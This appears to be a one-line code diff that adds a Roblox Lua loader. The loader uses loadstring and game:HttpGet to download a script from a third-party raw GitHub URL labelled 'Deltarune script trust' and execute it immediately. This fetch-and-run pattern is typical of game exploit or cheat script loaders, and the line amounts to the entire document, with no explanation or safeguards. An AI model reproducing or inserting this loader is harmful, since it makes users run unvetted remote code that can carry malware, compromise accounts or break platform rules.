@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlasamBr/Looeyayles/refs/heads/main/Deltarune%20script%20trust"))()
